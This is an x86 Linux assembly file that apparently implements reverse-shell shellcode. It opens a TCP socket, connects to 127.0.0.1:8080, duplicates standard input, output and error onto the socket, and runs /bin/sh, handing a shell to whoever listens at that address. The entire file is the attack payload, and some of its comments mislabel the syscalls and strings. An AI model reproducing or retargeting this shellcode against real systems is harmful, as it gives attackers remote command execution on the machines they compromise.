global _start
section .text

_start:

 xor eax, eax
 xor ebx, ebx
 xor ecx, ecx
 push eax ;push 0
 mov eax, 1
 push eax ; push 1
 mov ebx, eax ; ebx = 1
 inc eax
 push eax ; push 2
 mov al, 102 ; syscall sys_socketcall
 mov ecx, esp
 int 80h


 mov esi, eax ; sauvegarde socket_fd
 push 0x0100007f ; LADDR = 127.0.0.1
 push word 0x901f  ; LPORT 8080
 push word 0x2  ; AF_INET
 mov ecx, esp
 push byte 16 ; sizeof(LADDR) = 16
 push ecx
 push esi ; socket_fd
 mov eax, 102
 mov ebx, 3 ; SYS_CONNECT
 mov ecx, esp
 int 80h

 cmp eax, 0
    jnz exit
 mov ecx, 3

 dup2:
  dec ecx
  mov eax, 63 ; syscall dup3 ( file descriptor)
  int 80h
  ;dec ecx
  jnz dup2

 xor edx, edx ; edx = 0

 ;push edx
 push 0x68732f  ; push n/sh
 push 0x6e69622f  ; push //bi
 mov ebx, esp  ; ebx = //bin/sh
 push edx ; push NULL
 mov ecx, esp
 mov eax, 0x0b  ; syscall execve
 int 80h
	

 exit:
  xor eax, eax
  xor ebx, ebx
  xor ecx, ecx
  mov eax, 1
  int 80h ; exit 
